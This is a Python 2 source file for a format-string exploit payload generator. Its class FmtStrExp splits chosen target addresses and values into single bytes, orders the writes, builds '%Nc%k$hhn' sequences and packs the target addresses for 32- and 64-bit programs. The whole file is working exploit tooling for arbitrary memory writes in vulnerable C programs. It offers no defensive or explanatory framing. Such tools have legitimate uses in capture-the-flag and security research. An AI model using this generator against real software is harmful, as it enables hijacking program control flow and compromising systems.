import struct
import re
import math

p32 = lambda x : struct.pack('<L', x)
p64 = lambda x : struct.pack('<Q', x)

class FmtStrExp:
    printed = 0
    table = {
        32 : [p32, 4],
        64 : [p64, 0] # Make it 0 since in 64 bits exploit, address of target would be put at the end of payload
    }

    def __init__(self, printed=0, hij_tar=None, hij_val=None):
        self.hijack_target = hij_tar
        self.hijack_value = hij_val
        FmtStrExp.printed += printed
        
    @staticmethod
    def sort_multi_target(fmt_tuple, bits):
        '''Arrange value per byte for optimization'''
        final_fmt = []
        for fmt in fmt_tuple:
            final_fmt += [(fmt[0].hijack_target + i, (fmt[0].hijack_value >> 8 * i) & 0xff) for i in xrange(fmt[1])]
        return sorted(final_fmt, key=lambda x : (x[1] - FmtStrExp.table[bits][1] * len(final_fmt) - FmtStrExp.printed) & 0xff)
        
    @classmethod
    def generate_target(cls, total_fmt, bits):
        payload = ''.join(cls.table[bits][0](fmt[0]) for fmt in total_fmt)
        return payload

    @classmethod
    def generate_fmt(cls, total_fmt, offset, bits):

        ''' Basic setup '''
        if bits == 32:
            cls.printed += cls.table[bits][1] * len(total_fmt)
        printed = cls.printed # For 64 bits
        total_fmt = map(lambda x : x[1], total_fmt)
        payload = ''
        last_offset = 0

        ''' Calculate bytes to overwrite '''
        for idx, byte in enumerate(total_fmt):
            pad = ((byte - cls.printed) % 256 + 256) % 256
            if pad > 0:
                payload += "%{}c".format(pad)
            payload += "%{}$hhn".format(offset + idx)
            cls.printed += pad

        ''' For 64 bits '''
        if bits == 64:
            total_length = len(payload) + printed
            payload = re.split('\$hhn', payload)
            if offset < 10:
                total_length += 10 - offset
            total_length = int(math.ceil(total_length/8.0)) * 8
            offset = offset + total_length / 8

            ''' Replace correct offset '''
            for idx, item in enumerate(payload[:-1]):
                payload[idx] = re.sub('\%\d+$', '%{}'.format(offset + idx), payload[idx])
            payload = '$hhn'.join(payload)
            payload = payload.ljust(total_length - printed, '\x00')

        return payload

    @classmethod
    def generate(cls, fmt_tuple, off, bits):

        ''' Setup efficient order of hijack target '''
        total_fmt = FmtStrExp.sort_multi_target(fmt_tuple, bits)

        ''' Generate payload '''
        payload = FmtStrExp.generate_fmt(total_fmt, off, bits)
        if bits == 32:
            payload = FmtStrExp.generate_target(total_fmt, bits) + payload
        elif bits == 64:
            payload += FmtStrExp.generate_target(total_fmt, bits)
        else:
            raise ValueError('Wrong bits {}'.format(bits))

        ''' Clear printed '''
        FmtStrExp.printed = 0

        return payload

    @classmethod
    def size(cls):
        '''Return already printed words'''
        return cls.printed
